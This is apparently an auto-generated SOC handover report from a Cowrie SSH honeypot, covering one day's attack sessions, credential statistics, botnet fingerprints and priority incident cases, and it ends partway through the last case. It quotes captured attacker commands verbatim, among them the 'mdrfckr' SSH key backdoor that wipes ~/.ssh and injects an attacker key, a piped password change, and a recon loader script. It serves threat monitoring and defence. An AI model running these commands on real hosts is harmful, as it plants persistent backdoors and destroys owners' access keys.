# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-18 |
| **Generated At** | 2026-10-18T15:05:01Z |
| **Shift Time** | 15:05 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **381** |
| Confirmed Threats | **335** |
| False Positives Filtered | **46** (12.1%) |
| Unique Attacker IPs | **258** |
| Countries of Origin | **50** |
| High Severity Cases | **170** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **211** |
| Malware Samples Analyzed | **7** HIGH · **25** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **3531** |
| Unique Credential Pairs | **2580** |
| Unique Usernames | **1541** |
| Unique Passwords | **1488** |
| Successful Auth Pairs | **3314** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 404 |
| `ubuntu` | 164 |
| `admin` | 110 |
| `345gs5662d34` | 80 |
| `user` | 33 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 80 |
| `3245gs5662d34` | 77 |
| `123456` | 77 |
| `12345678` | 50 |
| `admin` | 44 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 80 |
| `root` | `3245gs5662d34` | 30 |
| `admin` | `admin` | 28 |
| `support` | `support` | 26 |
| `root` | `123456` | 14 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `first` | `fuckyou` | `109.160.32.47` | 2026-10-18T00:55:05 |
| `gl15` | `passwd` | `109.160.32.47` | 2026-10-18T00:55:10 |
| `cad` | `pass1234` | `109.160.32.47` | 2026-10-18T00:55:15 |
| `anton` | `madagascar` | `109.160.32.47` | 2026-10-18T00:55:20 |
| `admin` | `admin` | `39.107.142.38` | 2026-10-18T00:55:24 |
| `admin` | `admin` | `130.12.180.51` | 2026-10-18T00:55:25 |
| `amme` | `asdf1234@` | `109.160.32.47` | 2026-10-18T00:55:25 |
| `cdickens` | `server` | `109.160.32.47` | 2026-10-18T00:55:29 |
| `httpfs` | `sonar` | `109.160.32.47` | 2026-10-18T00:55:35 |
| `chenchao` | `fred` | `109.160.32.47` | 2026-10-18T00:55:39 |
| `prateek` | `apollo` | `109.160.32.47` | 2026-10-18T00:55:44 |
| `brau` | `steam` | `109.160.32.47` | 2026-10-18T00:55:50 |
| `kishore` | `a123456A` | `109.160.32.47` | 2026-10-18T00:55:55 |
| `bob` | `odoo123` | `109.160.32.47` | 2026-10-18T00:56:00 |
| `dbrady` | `alireza` | `109.160.32.47` | 2026-10-18T00:56:06 |
| `eagle11bench20` | `thin123` | `109.160.32.47` | 2026-10-18T00:56:11 |
| `5917` | `abcd@1234!` | `109.160.32.47` | 2026-10-18T00:56:17 |
| `gernot` | `runner` | `109.160.32.47` | 2026-10-18T00:56:22 |
| `a-config--23` | `wjw2019` | `109.160.32.47` | 2026-10-18T00:56:27 |
| `picofall13` | `carnaval` | `109.160.32.47` | 2026-10-18T00:56:32 |
_… 3294 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **381** |
| Sessions with Fingerprint | **28** |
| Unique HASSH Fingerprints | **28** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 135 |
| Go SSH scanner | 62 |
| Paramiko (Python) | 5 |
| OpenSSH | 4 |
| Unknown | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 113 | 59 |
| `16443846184e...` | Generic scanner | 19 | 8 |
| `2ec37a7cc8da...` | Mirai/variant | 15 | 5 |
| `eff4c24daffc...` | Modern SSH client | 7 | 1 |
| `03a80b21afa8...` | Modern SSH client | 6 | 4 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 113 | 59 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 19 | 8 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 15 | 5 | Mirai/variant |
| `95420f9d932d...` | libssh | 11 | 9 | — |
| `eff4c24daffc...` | Go SSH scanner | 7 | 1 | Modern SSH client |
| `03a80b21afa8...` | libssh | 6 | 4 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 5 | 2 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 4 | 4 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **16** |
| Campaign Clusters | **4** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 2 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 268 | 5 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 50 | 49 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "123\nxMOa3RiNpSsH\nxMOa3RiNpSsH"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `117.50.70.169`, `103.42.74.124`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.77`, `92.118.39.49`, `195.178.110.232`, `195.178.110.217`, `2.57.122.150`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `36.50.134.86`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **258** |
| Unique ASNs | **119** |
| High-Risk ASNs | **89** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 52 | HIGH |
| `AS25369` | Hydra Communications Ltd | 11 | HIGH |
| `AS396982` | Google LLC | 11 | HIGH |
| `AS4766` | Korea Telecom | 10 | HIGH |
| `AS14061` | DigitalOcean, LLC | 8 | HIGH |
| `AS4134` | CHINANET BACKBONE | 7 | HIGH |
| `AS63949` | Akamai Connected Cloud | 7 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 6 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (167)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-66d350390675

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]47` |
| **First Seen** | 2026-10-18 00:55 |
| **Last Seen** | 2026-10-18 00:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-18 00:55:04` | `cowrie.session.connect` |
| `2026-10-18 00:55:04` | `cowrie.client.version` |
| `2026-10-18 00:55:04` | `cowrie.client.kex` |
| `2026-10-18 00:55:05` | `cowrie.login.success` |
| `2026-10-18 00:55:06` | `cowrie.session.params` |
| `2026-10-18 00:55:06` | `cowrie.command.input` |
| `2026-10-18 00:55:06` | `cowrie.log.closed` |
| `2026-10-18 00:55:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]47` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b7735f2d3e9

| Field | Detail |
|---|---|
| **Source IP** | `39.107.142[.]38` |
| **First Seen** | 2026-10-18 00:55 |
| **Last Seen** | 2026-10-18 00:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-18 00:55:23` | `cowrie.session.connect` |
| `2026-10-18 00:55:23` | `cowrie.client.version` |
| `2026-10-18 00:55:23` | `cowrie.client.kex` |
| `2026-10-18 00:55:24` | `cowrie.login.success` |
| `2026-10-18 00:55:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.107.142[.]38` to AbuseIPDB if not already reported
- [ ] Block `39.107.142[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1859f7084bf

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-10-18 00:55 |
| **Last Seen** | 2026-10-18 00:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-18 00:55:24` | `cowrie.session.connect` |
| `2026-10-18 00:55:24` | `cowrie.client.version` |
| `2026-10-18 00:55:24` | `cowrie.client.kex` |
| `2026-10-18 00:55:25` | `cowrie.login.success` |
| `2026-10-18 00:55:27` | `cowrie.session.params` |
| `2026-10-18 00:55:27` | `cowrie.command.input` |
| `2026-10-18 00:55:27` | `cowrie.session.file_download` |
| `2026-10-18 00:55:27` | `cowrie.session.file_download` |
| `2026-10-18 00:55:27` | `cowrie.log.closed` |
| `2026-10-18 00:55:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8777aa610070

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-10-18 00:57 |
| **Last Seen** | 2026-10-18 00:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-18 00:57:03` | `cowrie.session.connect` |
| `2026-10-18 00:57:04` | `cowrie.client.version` |
| `2026-10-18 00:57:04` | `cowrie.client.kex` |
| `2026-10-18 00:57:04` | `cowrie.login.success` |
| `2026-10-18 00:57:06` | `cowrie.session.params` |
| `2026-10-18 00:57:06` | `cowrie.command.input` |
| `2026-10-18 00:57:06` | `cowrie.command.input` |
| `2026-10-18 00:57:06` | `cowrie.command.input` |
| `2026-10-18 00:57:06` | `cowrie.command.input` |
| `2026-10-18 00:57:06` | `cowrie.command.input` |
| `2026-10-18 00:57:06` | `cowrie.command.success` |
| `2026-10-18 00:57:06` | `cowrie.command.input` |
| `2026-10-18 00:57:06` | `cowrie.command.input` |
| `2026-10-18 00:57:06` | `cowrie.command.input` |
| `2026-10-18 00:57:06` | `cowrie.command.input` |
| … | _5 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-718ef248b9d8

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-18 00:59 |
| **Last Seen** | 2026-10-18 00:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-18 00:59:04` | `cowrie.session.connect` |
| `2026-10-18 00:59:04` | `cowrie.client.version` |
| `2026-10-18 00:59:04` | `cowrie.client.kex` |
| `2026-10-18 00:59:05` | `cowrie.login.success` |
| `2026-10-18 00:59:05` | `cowrie.direct-tcpip.request` |
| `2026-10-18 00:59:05` | `cowrie.direct-tcpip.data` |
| `2026-10-18 00:59:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af01244e7047

| Field | Detail |
|---|---|
| **Source IP** | `200.63.168[.]90` |
| **First Seen** | 2026-10-18 01:36 |
| **Last Seen** | 2026-10-18 01:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-18 01:36:30` | `cowrie.session.connect` |
| `2026-10-18 01:36:30` | `cowrie.client.version` |
| `2026-10-18 01:36:30` | `cowrie.client.kex` |
| `2026-10-18 01:36:31` | `cowrie.login.success` |
| `2026-10-18 01:36:32` | `cowrie.session.params` |
| `2026-10-18 01:36:32` | `cowrie.command.input` |
| `2026-10-18 01:36:32` | `cowrie.command.failed` |
| `2026-10-18 01:36:32` | `cowrie.log.closed` |
| `2026-10-18 01:36:33` | `cowrie.session.params` |
| `2026-10-18 01:36:33` | `cowrie.command.input` |
| `2026-10-18 01:36:33` | `cowrie.session.file_download` |
| `2026-10-18 01:36:33` | `cowrie.log.closed` |
| `2026-10-18 01:36:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.63.168[.]90` to AbuseIPDB if not already reported
- [ ] Block `200.63.168[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f2aa33b7518

| Field | Detail |
|---|---|
| **Source IP** | `200.63.168[.]90` |
| **First Seen** | 2026-10-18 01:36 |
| **Last Seen** | 2026-10-18 01:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-18 01:36:33` | `cowrie.session.connect` |
| `2026-10-18 01:36:33` | `cowrie.client.version` |
| `2026-10-18 01:36:33` | `cowrie.client.kex` |
| `2026-10-18 01:36:34` | `cowrie.login.success` |
| `2026-10-18 01:36:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.63.168[.]90` to AbuseIPDB if not already reported
- [ ] Block `200.63.168[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ceea3ae8382

| Field | Detail |
|---|---|
| **Source IP** | `181.66.139[.]236` |
| **First Seen** | 2026-10-18 01:36 |
| **Last Seen** | 2026-10-18 01:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-18 01:36:44` | `cowrie.session.connect` |
| `2026-10-18 01:36:44` | `cowrie.client.version` |
| `2026-10-18 01:36:44` | `cowrie.client.kex` |
| `2026-10-18 01:36:45` | `cowrie.login.success` |
| `2026-10-18 01:36:45` | `cowrie.session.params` |
| `2026-10-18 01:36:45` | `cowrie.command.input` |
| `2026-10-18 01:36:45` | `cowrie.command.failed` |
| `2026-10-18 01:36:45` | `cowrie.log.closed` |
| `2026-10-18 01:36:46` | `cowrie.session.params` |
| `2026-10-18 01:36:46` | `cowrie.command.input` |
| `2026-10-18 01:36:46` | `cowrie.session.file_download` |
| `2026-10-18 01:36:46` | `cowrie.log.closed` |
| `2026-10-18 01:36:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.66.139[.]236` to AbuseIPDB if not already reported
- [ ] Block `181.66.139[.]236` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9940a03ded48

| Field | Detail |
|---|---|
| **Source IP** | `181.66.139[.]236` |
| **First Seen** | 2026-10-18 01:36 |
| **Last Seen** | 2026-10-18 01:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-18 01:36:46` | `cowrie.session.connect` |
| `2026-10-18 01:36:46` | `cowrie.client.version` |
| `2026-10-18 01:36:47` | `cowrie.client.kex` |
| `2026-10-18 01:36:47` | `cowrie.login.success` |
| `2026-10-18 01:36:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.66.139[.]236` to AbuseIPDB if not already reported
- [ ] Block `181.66.139[.]236` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89069aca448a

| Field | Detail |
|---|---|
| **Source IP** | `14.116.189[.]74` |
| **First Seen** | 2026-10-18 02:21 |
| **Last Seen** | 2026-10-18 02:26 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-18 02:21:58` | `cowrie.session.connect` |
| `2026-10-18 02:21:58` | `cowrie.client.version` |
| `2026-10-18 02:21:58` | `cowrie.client.kex` |
| `2026-10-18 02:21:59` | `cowrie.login.success` |
| `2026-10-18 02:22:00` | `cowrie.session.params` |
| `2026-10-18 02:22:00` | `cowrie.command.input` |
| `2026-10-18 02:22:00` | `cowrie.command.failed` |
| `2026-10-18 02:26:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.116.189[.]74` to AbuseIPDB if not already reported
- [ ] Block `14.116.189[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-430fe59efba6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-10-18 02:22 |
| **Last Seen** | 2026-10-18 02:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-18 02:22:15` | `cowrie.session.connect` |
| `2026-10-18 02:22:15` | `cowrie.client.version` |
| `2026-10-18 02:22:15` | `cowrie.client.kex` |
| `2026-10-18 02:22:18` | `cowrie.login.success` |
| `2026-10-18 02:22:20` | `cowrie.session.params` |
| `2026-10-18 02:22:20` | `cowrie.command.input` |
| `2026-10-18 02:22:20` | `cowrie.command.input` |
| `2026-10-18 02:22:20` | `cowrie.command.input` |
| `2026-10-18 02:22:20` | `cowrie.command.input` |
| `2026-10-18 02:22:20` | `cowrie.command.input` |
| `2026-10-18 02:22:20` | `cowrie.command.success` |
| `2026-10-18 02:22:20` | `cowrie.command.input` |
| `2026-10-18 02:22:20` | `cowrie.command.input` |
| `2026-10-18 02:22:20` | `cowrie.command.input` |
| `2026-10-18 02:22:20` | `cowrie.command.input` |
| … | _5 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2e48cc36edb

| Field | Detail |
|---|---|
| **Source IP** | `147.50.231[.]135` |
| **First Seen** | 2026-10-18 02:22 |
| **Last Seen** | 2026-10-18 02:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-18 02:22:26` | `cowrie.session.connect` |
| `2026-10-18 02:22:26` | `cowrie.client.version` |
| `2026-10-18 02:22:27` | `cowrie.client.kex` |
| `2026-10-18 02:22:28` | `cowrie.login.success` |
| `2026-10-18 02:22:29` | `cowrie.session.params` |
| `2026-10-18 02:22:29` | `cowrie.command.input` |
| `2026-10-18 02:22:29` | `cowrie.command.failed` |
| `2026-10-18 02:22:30` | `cowrie.log.closed` |
| `2026-10-18 02:22:30` | `cowrie.session.params` |
| `2026-10-18 02:22:30` | `cowrie.command.input` |
| `2026-10-18 02:22:31` | `cowrie.session.file_download` |
| `2026-10-18 02:22:31` | `cowrie.log.closed` |
